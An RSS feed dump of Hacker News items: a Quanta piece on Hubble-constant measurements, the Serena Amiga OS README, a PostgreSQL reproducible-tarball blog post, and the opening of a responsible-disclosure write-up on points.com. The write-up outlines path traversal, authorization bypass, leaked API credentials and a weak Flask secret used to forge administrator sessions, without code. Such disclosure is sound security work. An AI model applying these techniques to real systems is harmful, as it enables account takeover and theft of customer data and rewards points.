</div></div><figure><div><p><img alt="A woman with black hair is seated in an armchair in front of a wall-spanning photo of the night sky." src="https://d2r55xnwy6nx47.cloudfront.net/uploads/2024/08/WendyFreedman-crNancyWong.webp"></p></div><figcaption><div><p>Wendy Freedman at the University of Chicago is exploring how Webb telescope observations can be squared with the standard cosmological model.</p><p>Nancy Wong</p></div></figcaption></figure><div><h2>Introduction</h2><div><p>But Freedman suspects that the Cepheid-based H<sub>0</sub> measurement is not as trustworthy as the others. It is extremely sensitive to assumptions about, for example, the elemental composition of the Cepheids, and each star’s neighborhood. Dust in the galactic disks where Cepheids live can absorb their light and dim them. The Webb’s infrared vision pierces the dust, but astronomers need to know how much dust is absorbing light so they can correct for it. For this, Freedman and her colleagues turned to archival Hubble telescope data, which captures the “dust depth,” but it’s not as high-resolution as Webb data. That added uncertainties in the calculated distances, she said.</p>
<p>Another issue surfaced. The 11 galaxies they studied with the Webb telescope are the ones nearest to Earth that host all four relevant objects (JAGBs, TRGBs, Cepheids and the relevant type of supernova). But according to Freedman, the galaxies’ supernovas seemed to be intrinsically brighter than the ones in farther galaxies. This is another puzzle cosmologists have yet to understand, and it also affects the H<sub>0</sub> value. “I think this is going to be where we’re really going to all have to focus our attention on in the next few years,” she said.</p>
<p>Their paper reports three separate H<sub>0</sub> values. The JAGB measurement — the one that was done in a completely blind way, without any subsequent correcting — gives 67.96 km/s/Mpc, give or take 1.71 km/s/Mpc. That’s smack-dab on top of the theoretical prediction, seeming to confirm the standard model of cosmology.</p>
<p>TRGBs yield a value of 69.85 with similar error margins. The result also alleviates the Hubble tension.</p>

<p>The Cepheid method put the value of H<sub>0</sub> higher, at 72.05, but with more subjectivity involved: Different assumptions about the stars’ characteristics caused the value to range from 69 to 73. The high end of the range matches Riess’ measurements; at the low end, the Hubble tension all but goes away.</p>
<p>“I don’t think we can just say that the Hubble constant is&nbsp;73,” Freedman said. “I think this is the first test of the&nbsp;Cepheid distance scale,” meaning that JAGBs and TRGBs are serving as a check on the more established method. “And we’re not getting the same answer when we test the Cepheids. So I&nbsp;think it’s important.”</p>
<p>Combining the methods and uncertainties yielded an average H<sub>0</sub> value of 69.96 with a 4% uncertainty. That margin of error overlaps with both the theoretical prediction for the cosmic expansion rate and Riess’ team’s higher value.</p>
<p>“We don’t yet, I think, have the evidence to&nbsp;unambiguously conclude that there’s a [Hubble] tension,” Freedman said. “I just don’t see it.”</p>
<p>“Everything depends on tracking down all of these systematic errors,” Perlmutter said.</p>
<h2><strong>Tensions and Resolutions</strong></h2>
<p>The James Webb Space Telescope is also enabling additional ways to measure H<sub>0</sub>. For instance, astronomers are in the early phases of using how mottled a galaxy looks as a proxy for its distance. The idea is simple: Closer galaxies look clumpier because you can resolve some of their stars, whereas more distant galaxies appear smoother. “It’s basically a way to turn the crowding into a measure of distance,” said Anand, who is involved with this project in addition to his work with Riess.</p>

<p>A different method also offers some hope: A massive cluster of galaxies acts like a warped magnifying glass, bending and magnifying the image of an object behind it and creating multiple images of the same object as its light takes multiple paths. The University of Arizona astronomer <a href="https://www.as.arizona.edu/people/faculty/brenda-frye">Brenda Frye</a> leads a program to observe seven clusters with the Webb telescope. When Frye and her colleagues looked at their first telescope image last year, featuring the massive galaxy cluster G165, “we all just said, ‘What are those three dots that weren’t there before?’” she recalled. The dots were three separate images of the same supernova that had exploded behind the cluster.</p>
<p>After repeatedly observing the image, they could calculate the differences between the arrival times of the three lensed supernova images. The time delay is proportional to, and can be used to infer, the Hubble constant. “[It] is a one-step measurement for H<sub>0</sub>,” Frye said, “which makes it completely independent.” They <a href="https://arxiv.org/abs/2403.18902">measured</a> an expansion rate of 75.4 km/s/Mpc, although with a large uncertainty of +8.1 or −5.5 km/s/Mpc. Frye expects to refine those error bars after a few more years of similar measurements.</p>
<p>Both Riess’ and Freedman’s teams also anticipate that the next few years of JWST observations will enable them to home in on an answer with their traditional, star-based methods.</p>
<p>“With the improvement in the data, this is ultimately going to be solved, and I think pretty quickly,” Freedman said. “We’re going to get to the bottom of this.”</p>
</div></div></div><div><h2>Next article</h2><p>The Geometric Tool That Solved Einstein’s Relativity Problem</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Serena: An experimental operating system for 32bit Amiga computers (118 pts)]]></title>
            <link>https://github.com/dplanitzer/Serena</link>
            <guid>41233811</guid>
            <pubDate>Tue, 13 Aug 2024 09:33:28 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/dplanitzer/Serena">https://github.com/dplanitzer/Serena</a>, See on <a href="https://news.ycombinator.com/item?id=41233811">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><h2 tabindex="-1" dir="auto">About The Project</h2><a id="user-content-about-the-project" aria-label="Permalink: About The Project" href="#about-the-project"></a></p>
<p dir="auto">Serena is an experimental operating system based on modern design principles with support for pervasive preemptive concurrency and multiple users. The kernel is object-oriented and designed to be cross-platform and future proof. It runs on Amiga systems with a 68030 or better CPU installed.</p>
<p dir="auto">One aspect that sets it aside from traditional threading-based OSs is that it is purely built around dispatch queues somewhat similar to Apple's Grand Central Dispatch. There is no support for creating threads in user space nor in kernel space. Instead the kernel implements a virtual processor concept where it dynamically manages a pool of virtual processors. The size of the pool is automatically adjusted based on the needs of the dispatch queues and virtual processors are assigned to processes as needed. All kernel and user space concurrency is achieved by creating dispatch queues and by submitting work items to dispatch queues. Work items are simply closures (a function with associated state) from the viewpoint of the user.</p>
<p dir="auto">Another interesting aspect is interrupt handling. Code which wants to react to an interrupt can register a counting semaphore with the interrupt controller for the interrupt it wants to handle. The interrupt controller will then signal the semaphore every time the interrupt occurs. Use of a counting semaphore ensures that the code which is interested in the interrupt does not miss the occurrence of an interrupt. The advantage of translating interrupts into signals on a semaphore is that the interrupt handling code executes in a well-defined context that is the same kind of context that any other kind of code runs in. It also gives the interrupt handling code more flexibility since it does not have to immediately react to an interrupt. The information that an interrupt has happened is never lost, whether the interrupt handler code happened to be busy with other things at the time of the interrupt or not.</p>
<p dir="auto">The kernel is generally reentrant. This means that virtual processors continue to be scheduled and context switched preemptively even while the CPU is executing inside the kernel. Additionally a full compliment of counting semaphores, condition variables and lock APIs are available inside the kernel. The API of those objects closely resembles what you would find in a user space implementation of a traditional OS.</p>
<p dir="auto">Serena implements a hierarchical process structure similar to POSIX. A process may spawn a number of child processes and it may pass a command line and environment variables to its children. A process accesses I/O resources via I/O channels which are similar to file descriptors in POSIX.</p>
<p dir="auto">There are two notable differences between the POSIX style process model and the Serena model though: first instead of using fork() followed by exec() to spawn a new process, you use a single function in Serena called Process_Spawn(). This makes spawning a process much faster and significantly less error prone.</p>
<p dir="auto">Secondly, a child process does not inherit the file descriptors of its parent by default. The only exception are the file descriptors 0, 1 and 2 which represent the terminal input and output streams. This model is much less error prone compared to the POSIX model where a process has to be careful to close file descriptors that it doesn't want to pass on to a child process before it spawns a child. Doing this was easy in the early days of Unix when applications were pretty much self contained and when there was no support for dynamic libraries. It's the opposite today because applications are far more complex and depend on many 3rd party libraries.</p>
<p dir="auto">The executable file format at this time is the Atari ST GemDos file format which is a close relative to the aout executable format. This file format will be eventually replaced with a file format that will be able to support dynamic libraries. However for now it is good enough to get the job done.</p>
<p dir="auto">The kernel implements SerenaFS which is a hierarchical file system with permissions and user and group information. A file system may be mounted on top of a directory located in another file system to expand the file namespace. All this works similar to how it works in POSIX systems. A process which wants to spawn a child process can specify that the child process should be confined to a sub-tree of the global file system namespace.</p>
<p dir="auto">The boot file system is currently RAM-based. The ROM contains a disk image which is created with the diskimage tool and which serves as a template for the RAM disk. This ROM disk image is copied to RAM at boot time.</p>
<p dir="auto">User space has support for libc, libsystem, libclap and the very beginnings of libm. Libsystem is a library that implements the user space side of the kernel interface. Libclap is a library that implements argument parsing for command line interface programs.</p>
<p dir="auto">Serena OS comes with a shell which implements a formally defined shell language. You can find the shell document <a href="https://github.com/dplanitzer/Serena/blob/main/Commands/shell/README.md">here</a>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Features</h2><a id="user-content-features" aria-label="Permalink: Features" href="#features"></a></p>
<p dir="auto">The following kernel services are implemented at this time:</p>
<ul dir="auto">
<li>Kernel and user space separation in the sense of code privilege separation (not memory space separation)</li>
<li>Dispatch queues with execution priorities</li>
<li>Virtual processors with priorities and pervasive preemptive scheduling</li>
<li>Interrupt handling with support for direct and semaphore-based interrupt handling</li>
<li>Simple memory management (no virtual memory support yet)</li>
<li>In-kernel object runtime system (used for drivers and file systems)</li>
<li>Hierarchical processes with support for command line arguments, environment variables and I/O resource descriptor inheritance</li>
<li>Hierarchical file system structure with support for mounting/unmounting file systems</li>
<li>The SerenaFS file system</li>
<li>Support for ROM and RAM-based disks</li>
<li>Support for aout/GemDos executables</li>
<li>Support for pipes</li>
<li>Floppy disk driver</li>
<li>Monotonic clock</li>
<li>Repeating timers</li>
<li>Counting semaphores, condition variables and locks (mutexes)</li>
<li>Zorro II and III expansion board detection and enumeration</li>
<li>Event driver with support for keyboard, mouse, digital Joystick, analog joystick (paddles) and light pens</li>
<li>Simple graphics driver (not taking advantage of the Blitter yet)</li>
<li>VT52 and VT100 series compatible interactive console</li>
</ul>
<p dir="auto">The following user space services are available at this time:</p>
<ul dir="auto">
<li>A system library with support for processes, dispatch queues, time and file I/O</li>
<li>C99 compatible libc</li>
<li>Beginnings of a C99 compatible libm</li>
<li>libclap command line interface argument parsing library</li>
</ul>
<p dir="auto">The following user space programs are available at this time:</p>
<ul dir="auto">
<li>An <a href="https://github.com/dplanitzer/Serena/blob/main/Commands/shell/README.md">interactive shell</a> with command line editing and history support</li>
</ul>
<p dir="auto">The level of completeness and correctness of the various modules varies quite a bit at this time. Things are generically planned to improve over time :)</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Supported Hardware</h2><a id="user-content-supported-hardware" aria-label="Permalink: Supported Hardware" href="#supported-hardware"></a></p>
<p dir="auto">The following hardware is supported at this time:</p>
<ul dir="auto">
<li>Amiga 2000, 3000 and 4000 motherboards</li>
<li>Newer than the original chipsets work, but their specific features are not used</li>
<li>Motorola 68030, 68040 and 68060 CPU. Note that the CPU has to be at least a 68030 class CPU</li>
<li>Motorola 68881 and 68882 FPU</li>
<li>Standard Commodore Amiga floppy drive</li>
<li>Zorro II and Zorro III memory expansion boards</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Getting Started</h2><a id="user-content-getting-started" aria-label="Permalink: Getting Started" href="#getting-started"></a></p>
<p dir="auto">Setting the project up for development and running the OS is a bit involved. The instructions below are for Windows but they should work pretty much the same on Linux and macOS.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Prerequisites</h3><a id="user-content-prerequisites" aria-label="Permalink: Prerequisites" href="#prerequisites"></a></p>
<p dir="auto">The first thing you will need is an Amiga computer emulator. I'm using WinUAE which you can download from <a href="https://www.winuae.net/download" rel="nofollow">https://www.winuae.net/download</a></p>
<p dir="auto">Download the WinUAE installer and run it. This will place the emulator inside the 'Program Files' directory on your boot drive.</p>
<p dir="auto">Next download and install the VBCC compiler and assembler needed to build the operating system. You can find the project homepage is at <a href="http://www.compilers.de/vbcc.html" rel="nofollow">http://www.compilers.de/vbcc.html</a> and the download page for the tools at <a href="http://sun.hasenbraten.de/vbcc" rel="nofollow">http://sun.hasenbraten.de/vbcc</a>.</p>
<p dir="auto">The version that I'm using for my development and that I know works correctly on Windows 11 is 0.9h. Be sure to add an environment variable with the name <code>VBCC</code> which points to the VBCC folder on your disk and add the <code>vbcc\bin</code> folder to the <code>PATH</code> environment variable.</p>
<p dir="auto">Note that you need to have Microsoft Visual Studio and command line tools installed because the Microsoft C compiler is needed to build the build tools on Windows.</p>
<p dir="auto">Finally install GNU make for Windows and make sure that it is in the <code>PATH</code> environment variable. A straight-forward way to do this is by executing the following winget command in a shell window: <code>winget install GnuWin32.Make</code>.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Building the Build Tools</h3><a id="user-content-building-the-build-tools" aria-label="Permalink: Building the Build Tools" href="#building-the-build-tools"></a></p>
<p dir="auto">You only need to execute this step once and before you try to build the OS. The purpose of this step is to build a couple of tools that are needed to build the kernel and user space libraries. You can find documentation for these tools <a href="https://github.com/dplanitzer/Serena/blob/main/Tools/README.md">here</a>.</p>
<p dir="auto">First open a Developer Command Prompt in Windows Terminal and then cd into the <code>Serena/Tools</code> folder. Type <code>make</code> and hit return. This will build all required tools and place them inside a <code>Serena/build/tools</code> folder. The tools will be retained in this location even if you do a full clean of the OS project.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Building the Operating System</h3><a id="user-content-building-the-operating-system" aria-label="Permalink: Building the Operating System" href="#building-the-operating-system"></a></p>
<p dir="auto">Open the Serena project folder in Visual Studio Code and select <code>Build All</code> from the <code>Run Build Task...</code> menu. This will build the kernel, libsystem, libc, libm and shell and generate a single <code>Serena.rom</code> file inside the <code>Serena/product/Kernel/</code> folder. This ROM file contains the kernel, user space libraries and the shell.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Running the Demo</h3><a id="user-content-running-the-demo" aria-label="Permalink: Running the Demo" href="#running-the-demo"></a></p>
<p dir="auto">First you'll need to create an Amiga configuration with at least a 68030 CPU (i.e. Amiga 3000 or 4000) in WinUAE if you haven't already. The easiest way to do this is by going to Quickstart and selecting A4000 as the model. Then go to the Hardware/ROM page and update the "Main ROM file" text field such that it points to the <code>Serena.rom</code> file inside the <code>Serena/build/product/</code> folder on your disk. Finally give your virtual Amiga at least 1MB of Fast RAM by going to the Hardware/RAM page and setting the "Slow" entry to 1MB. Save this configuration so that you don't have to recreate it next time you want to run the OS.</p>
<p dir="auto">Load the configuration and then hit the Start button or simply double-click the configuration in the Configurations page to run the OS. The emulator should open a screen that shows a boot message and then a shell prompt. See the <a href="https://github.com/dplanitzer/Serena/blob/main/Commands/shell/README.md">shell</a> page for a list of commands that are supported by the shell.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">License</h2><a id="user-content-license" aria-label="Permalink: License" href="#license"></a></p>
<p dir="auto">Distributed under the MIT License. See <code>LICENSE.txt</code> for more information.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Contact</h2><a id="user-content-contact" aria-label="Permalink: Contact" href="#contact"></a></p>
<p dir="auto">Dietmar Planitzer - <a href="https://www.linkedin.com/in/dplanitzer" rel="nofollow">@linkedin</a></p>
<p dir="auto">Project link: <a href="https://github.com/dplanitzer/Serena">https://github.com/dplanitzer/Serena</a></p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The new PostgreSQL 17 make dist (183 pts)]]></title>
            <link>http://peter.eisentraut.org/blog/2024/08/13/the-new-postgresql-17-make-dist</link>
            <guid>41232621</guid>
            <pubDate>Tue, 13 Aug 2024 05:43:49 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="http://peter.eisentraut.org/blog/2024/08/13/the-new-postgresql-17-make-dist">http://peter.eisentraut.org/blog/2024/08/13/the-new-postgresql-17-make-dist</a>, See on <a href="https://news.ycombinator.com/item?id=41232621">Hacker News</a></p>
<div id="readability-page-1" class="page"><div aria-label="Content">
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>When the PostgreSQL project makes a release, the primary artifact of
that is the publication of a <a href="https://ftp.postgresql.org/pub/source/">source code
tarball</a>.  That represents the
output of all the work that went into the creation of the PostgreSQL
software up to the point of the release.  The source tarball is then
used downstream by packagers to make binary packages (or file system
images or installation scripts or similar things), or by some to build
the software from source by hand.</p>

<p>Creating a source code tarball is actually quite tricky to do by hand.
Of course, you could just run “tar” over a currently checked out
source tree.  But you need to be careful that the checkout is clean
and not locally modified.  You need to ensure that all the files that
belong in the tarball end up there and no other files.  There are
certain source control files that you don’t want to include in the
tarball.  File permissions and file ownership need to be sane.  And
all this should work consistently across platforms and across time.
Fortunately, this has all been
<a href="https://git.postgresql.org/gitweb/?p=postgresql.git;a=blob;f=GNUmakefile.in;h=9c18c562330c5beefb239db52359c7fa27012c1b;hb=05ffe9398b758bbb8d30cc76e9bbc638dab2d477#l85">scripted</a>
and has been pretty reliable over the years.</p>

<p>Additionally, a PostgreSQL source code tarball has included various
prebuilt files.  These are files that are not actually part of the
source code checked into Git, but they would be built as part of a
normal compilation.  For example, a source code tarball has included
prebuilt Bison and Flex files, various .c and .h files generated by
Perl scripts, and HTML and man page documentation built from DocBook
XML files.  The reason for this is a mix of convenience and
<a href="https://www.gnu.org/prep/standards/html_node/Releases.html">traditional
practice</a>.
All these output files are platform-independent and independent of
build options.  So everyone will get the same ones anyway, so we might
as well prebuild them.  Also, that way, users of the source tarball
won’t need the tools to build these files.  For example, you didn’t
actually need Perl to build PostgreSQL from a source tarball, because
all the files generated from Perl scripts were already built.  Also,
historically (very historically), PostgreSQL was pushing the limits of
Bison and Flex (or various other yacc and lex implementations, when
those were still supported), so it was convenient and less error-prone
to give everyone the same prebuilt Bison and Flex output files.</p>

<p>This system has two major problems that have now led to the point that
we got rid of it in PostgreSQL&nbsp;17.</p>

<p>First, implementing and maintaining this arrangement in the build
system is quite tricky.  You need to carefully maintain the different
states of “clean source code”, “partially built source code”, and
“fully built source code”, and the commands to transition between
them.  (This was <code>make distprep</code> and <code>make all</code>, and then <code>make clean</code>
and <code>make maintainer-clean</code> to move the other way.)  Making it work
with out-of-tree (“vpath”) builds was extremely weird: If you built
from a source tarball, the Bison (etc.) output files were in the
source directory, but if you build from a Git checkout, the Bison
output files were in the build directory, and you need to support both
of these sanely.  Finally, the new Meson build system is extremely
allergic against writing build output into the source directory.</p>

<p>Some of the historical reasons are also obsolete.  It’s not a problem
anymore to get a good version of Bison and Flex installed.  Everybody
can easily get Perl installed nowadays.  The documentation build can
still be a bit tricky, but it’s generally much easier and robust than
a few decades ago.</p>

<p>Second, a lot more attention is nowadays paid to the software supply
chain.  There are security and legal reasons for this.  When users
install software, they want to know where it came from, and they want
to be sure that they got the right thing, not some fake version or
some version of dubious legal provenance.</p>

<p>The downstream packaging practice has already paid attention to this
for many years.  Packages or package repositories are
cryptographically signed, so you can be sure that what you install
came from a trustworthy source.  There have also been efforts to make
binary builds <a href="https://reproducible-builds.org/">reproducible</a>, so
that you can be sure that the binary files in your binary package are
what you’d expect them to be.  Some packagers have policies that
everything needs to be built from source, so they’d just delete and
rebuild the prebuilt files anyway.</p>

<p>At the other end of the software production pipeline, using Git as the
source control system gives some integrity guarantees that you are
getting the same source code that everybody else is getting.  So if
I’m looking at commit
<a href="https://git.postgresql.org/gitweb/?p=postgresql.git;a=commitdiff;h=b18b3a8150dbb150124bd345e000d6dc92f3d6dd">b18b3a8150dbb150124bd345e000d6dc92f3d6dd</a>
and I see that same commit on various public servers, that’s probably
the same commit that everybody else is seeing.  And I can check what
the parents of that commit are and how the code got to that point and
so on.</p>

<p>But what we didn’t have until now is a transparent and reproducible
way to get from that commit to the release tarball.</p>

<p>The way the <a href="https://wiki.postgresql.org/wiki/Release_process">tarball creation
works</a> is that the
person who prepares the release runs <code>make dist</code> on a machine that is
specially kept “clean” for that purpose.  How can a third party verify
this process?  The produced tarball was not perfectly reproducible.
If you run <code>make dist</code> yourself, you’ll get a similar but not
identical tarball.  A way to verify whether a tarball was sane was to
unpack it and diff the contents against a source directory or an
unpacked tarball that you made yourself.  But this requires manual
judgment.  The Bison and Flex files won’t be the same unless you used
the identical versions.  The built documentation also won’t be
perfectly identical.  File timestamps will be different.  Also you’d
need to carefully check manually whether files are missing or too
many.  This was not fully satisfactory.</p>

<p>(This work overlapped with the discovery of the <a href="https://en.wikipedia.org/wiki/XZ_Utils_backdoor">XZ Utils
backdoor</a>, which
exploited (among other things) exactly this non-reproducible tarball
creation process.  But I want to be clear that this is a complete
coincidence, and this work was neither done as a response to that nor
are there are any suspicions that any PostgreSQL tarballs might have
been compromised.)</p>

<p>Anyway, with PostgreSQL 17, this is changed.  The tarball generation
is still invoked by calling <code>make dist</code>, but that
<a href="https://git.postgresql.org/gitweb/?p=postgresql.git;a=blob;f=GNUmakefile.in;h=cf6e759486eded7bf95e12617bfa2d6765eeffdf;hb=b18b3a8150dbb150124bd345e000d6dc92f3d6dd#l85">internally</a>
now calls <a href="https://git-scm.com/docs/git-archive"><code>git archive</code></a>.  <code>git
archive</code> packs the files belonging to a given Git commit into a tar
(or other) archive in a reproducible and verifiable way.  Therefore,
if I now run <code>make dist</code> on a given commit (such as a release tag),
then I will get the exact same (bit-identical) tarball as the next
person.  A packager can now trace the tarball back to the Git
repository, and in turn an end-user can trace a binary package back to
the Git repository as well (assuming reproducible builds, which is an
ongoing struggle).</p>

<p>(To be clear, this change is only in major version PostgreSQL 17 and
(presumably) future major versions.  The maintenance releases for
older major versions (16 and back) will continue to be published using
the old method until they go out of support.)</p>

<p><a href="https://www.postgresql.org/message-id/flat/40e80f77-a294-4f29-a16f-e21bc7bc75fc%40eisentraut.org">Getting this to
work</a>
was also not entirely straightforward.  You need to carefully
calibrate the <code>git archive</code> options to make sure this works
consistently across platforms and local Git configurations.  Which is
why we’re keeping the <code>make dist</code> invocation as a wrapper.  Also, you
need a new enough version of Git for this (2.38.0 or newer).
Currently, the Git version used to produce the release tarballs (on
the above-mentioned “clean” box) is too old to create reproducible
<code>.tar.gz</code> tarballs, but it will create reproducible <code>.tar.bz2</code>
tarballs.  The latter is what most users and packagers use anyway.  If
you care about this, avoid the <code>.tar.gz</code> for now.</p>

<p>I think this is progress, if you care about software supply chain
integrity.  (It’s also a relief if you care about maintaining the
build system.)  There are certainly more things that could be done.
One thing mentioned above is that reproducible builds don’t work for
PostgreSQL in all situations.  My understanding is that this needs to
be fixed elsewhere, though.  Another topic is more traceability about
how things get <em>into</em> the Git repository.  The <code>make dist</code> change only
ensures that once code is in the Git repository, you can trace it from
there, ideally all the way to the end user installation.  There are,
of course, various technical and social processes in the PostgreSQL
developer community that monitor the integrity of the source code, but
there is nothing currently that checks in a computerized,
cryptographic way the origin of what goes into the Git repository.  So
something like signed commits might be worth looking into in the
future in order to improve this further.</p>

  </div>
  
  
</article>

      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Hacking the largest airline and hotel rewards platform (2023) (242 pts)]]></title>
            <link>https://samcurry.net/points-com</link>
            <guid>41232446</guid>
            <pubDate>Tue, 13 Aug 2024 05:10:14 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://samcurry.net/points-com">https://samcurry.net/points-com</a>, See on <a href="https://news.ycombinator.com/item?id=41232446">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><h2 id="introduction">Introduction</h2>
<p>Between March 2023 and May 2023, we identified multiple security vulnerabilities within points.com, the backend provider for a significant portion of airline and hotel rewards programs. These vulnerabilities would have enabled an attacker to access sensitive customer account information, including names, billing addresses, redacted credit card details, emails, phone numbers, and transaction records. Moreover, the attacker could exploit these vulnerabilities to perform actions such as transferring points from customer accounts and gaining unauthorized access to a global administrator website. This unauthorized access would grant the attacker full permissions to issue reward points, manage rewards programs, oversee customer accounts, and execute various administrative functions.</p>
<p>Upon reporting these vulnerabilities, the points.com team responded very quickly, acknowledging each report within an hour. They promptly took affected websites offline to conduct thorough investigations and subsequently patched all identified issues. All vulnerabilities reported in this blog post have since been remediated.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fnick.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fnick.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fnick.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fnick.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fnick.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fnick.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fnick.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fnick.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fnick.png&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<h2 id="collaborators">Collaborators</h2>
<ul>
<li>Ian Carroll (<a href="https://twitter.com/iangcarroll">https://twitter.com/iangcarroll</a>)</li>
<li>Shubham Shah (<a href="https://twitter.com/infosec_au">https://twitter.com/infosec_au</a>)</li>
<li>Sam Curry (<a href="https://twitter.com/samwcyo">https://twitter.com/samwcyo</a>)</li>
</ul>
<h2 id="high-level-overview">High Level Overview</h2>
<p>The following is a high level overview of the reported vulnerabilities. For the technical write-ups, please scroll down to the "Investigating Points.com" section.</p>
<p><strong>Directory Traversal leads to Query Access to Points.com Customer Order Records (March 7, 2023)</strong></p>
<p>Our first report was an unauthenticated HTTP path traversal allowing access to an internal API which would've allowed an attacker to query entries from a set of 22 million order records. The data within the records included partial credit card numbers, home addresses, email addresses, phone numbers, reward points numbers, customer authorization tokens, and miscellaneous transaction details. This information could be queried through an API call that returned one-hundred results per HTTP request. By appending optional sorting parameters, an attacker could enumerate the data or query for specific information (e.g. searching a customer's name or email address).</p>
<p><strong>Ability to Transfer Rewards Points and Leak Customer Information using only Rewards Number and Surname (March 7, 2023)</strong></p>
<p>The second vulnerability we reported was an authorization bypass that would allow an attacker to transfer airline rewards points from other users by knowing only their surname and rewards points number (both of these fields were disclosed in our first vulnerability report) via an improperly configured API. An attacker could generate full account authorization tokens which would allow them to manage customer accounts, view order history, view billing information, view contact information, and transfer points from customers.</p>
<p>For both of the initial reports, the team responded in under 10 minutes and immediately took the websites offline. The issues were quickly fixed and the websites were back online shortly thereafter.</p>
<p><strong>Leaked Tenant Credentials for Virgin Rewards Program allows Attacker to Sign API Requests on Behalf of Virgin (Add/Remove Rewards Points, Access Customer Accounts, Modify Rewards Program Settings, etc.)</strong></p>
<p>On May 2nd, 2023, we discovered an endpoint on a points.com-hosted Virgin rewards website that leaked the "macID" and "macKey" used by Virgin to authenticate to the core points.com API on behalf of the airline. The credentials could be used to fully authenticate as the airline to the "lcp.points.com" API by signing HTTP requests using the disclosed secret, allowing an attacker to call any of the API calls intended for the airline like modifying customer accounts, adding/removing points, or modifying settings related to the Virgin rewards program.</p>
<p>The points.com team responded and fixed the issue within only an hour.</p>
<p><strong>New Method for Transferring Airline Miles and Accessing Customer Account and Order Information from United MileagePlus members (April 29th, 2023)</strong></p>
<p>On April 29th, 2023, we identified an additional fourth vulnerability affecting specifically United Airlines where an attacker could generate an authorization token for any user knowing only their rewards number and surname. Through this issue, an attacker could both transfer miles to themselves and authenticate as the member on multiple apps related to MileagePlus, potentially including the MileagePlus administrator panel. This issue disclosed the member's name, billing address, redacted credit card information, email, phone number, and past transactions on the account.</p>
<p>After reporting the issue, the team responded in under 10 minutes and immediately took the website offline. The issue was quickly fixed and the website was back online shortly thereafter.</p>
<p><strong>Full Access to Global Points.com Administration Console and Loyalty Wallet Administration Panel via Weak Flask Session Secret (May 2nd, 2023)</strong></p>
<p>On May 2nd, 2023, we identified that the Flask session secret for the points.com global administration website used to manage all airline tenant and customer accounts was the word "secret". After discovering this vulnerability, we were able to resign our session cookies with full super administrator permissions.</p>
<p>After resigning the cookie with roles that give full administrator permissions, we observed that we could access all core administration functionality on the website, including user lookup, manual bonuses, rewards points conversion modifications (e.g. setting the exchange rate between two programs where 1 point would give you 1 million points), and many more points.com administrative endpoints (e.g. managing promotions, branding, resetting loyalty program credentials, etc.). An attacker could abuse this access to revoke existing reward program credentials and temporarily take down airline rewards functionality.</p>
<p>For our last vulnerability report, the team responded within an hour (even though we'd reported it at 3:30 AM CST) by taking the website offline and changing the secret.</p>
<h2 id="investigating-pointscom">Investigating Points.com</h2>
<p>With the cost of air travel becoming so expensive recently, I've gotten more and more into the "credit card churning" community where you can try to gamify credit cards and purchases to save rewards points which can be converted into things like flights and hotels. From a hacker's perspective, it's super interesting seeing a system that stores a numeric value that's essentially one-step from being used as an actual currency. The more and more I used these systems, the more interested I became in figuring out how they worked and what systems actually powered the rewards points industry.</p>
<p>I sent a message to <a href="https://twitter.com/iangcarroll">Ian Carroll</a>, someone who has a huge amount of experience hacking airlines who also runs an airline rewards booking website called <a href="https://seats.aero/">seats.aero</a>, expressing my interest in finding vulnerabilities in the rewards program infrastructure. After chatting for a while, we then pulled in <a href="https://twitter.com/infosec_au">Shubham Shah</a>, another another hacker who has been hunting on airlines for years, and started a group chat with the goal of finding security vulnerabilities affecting the rewards points ecosystem.</p>
<p>When we began our research, we found that a company called points.com was the provider for nearly all major rewards programs globally. Every airline that I'd ever flown had used points.com as their backend for storing and processing reward points. They seemed to be the leader in the space, and they even had a <a href="https://points.com/.well-known/security.txt">security.txt</a> page on their website.</p>
<h3 id="how-does-it-all-work">How does it all work?</h3>
<p>After searching through Github and reading points.com documentation for a few hours, we found that there was an API built for rewards programs to use running on the "lcp.points.com" website. While looking through public repositories, we found a link to what looked like API documentation for the "lcp.points.com" API that had since been removed from the internet. Luckily for us, there was a copy of it available on archive.org.</p>
<p>The archived API documentation described ways in which reward programs could authenticate users, reward loyalty points, transfer loyalty points, spend loyalty points, and much more.</p>
